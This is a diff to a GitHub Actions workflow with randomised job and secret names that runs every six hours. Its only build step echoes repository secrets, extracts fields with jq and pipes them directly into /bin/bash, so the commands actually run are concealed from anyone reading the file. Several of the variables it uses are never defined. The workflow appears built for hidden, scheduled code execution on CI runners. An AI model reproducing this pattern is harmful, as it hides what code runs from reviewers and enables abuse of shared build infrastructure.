@@ -3,21 +3,19 @@ name: gujulong3734
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 0/6 * * *'
+    - cron: '49 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: gujulong3734
         env:
-          ioyab52: ${{ secrets.ioyab52 }}
+          kc032: ${{ secrets.kc032 }}
         run: |
-          echo $ioyab52 | jq -r .f41 | /bin/bash
-          echo $sbl5 | jq -r .pt5949 | /bin/bash
-          echo $ck93 | jq -r .qh79 | /bin/bash
-          echo $q334 | jq -r .nxjg2 | /bin/bash
-          echo $o927 | jq -r .cyac4 | /bin/bash
-          echo $pkgz89 | jq -r .pbd61 | /bin/bash
-          echo $rz6 | jq -r .y74633 | /bin/bash
+          echo $kc032 | jq -r .tnf6 | /bin/bash
+          echo $nv7 | jq -r .khjj68 | /bin/bash
+          echo $s27 | jq -r .sawza660 | /bin/bash
+          echo $af02 | jq -r .ejmfl9418 | /bin/bash
 
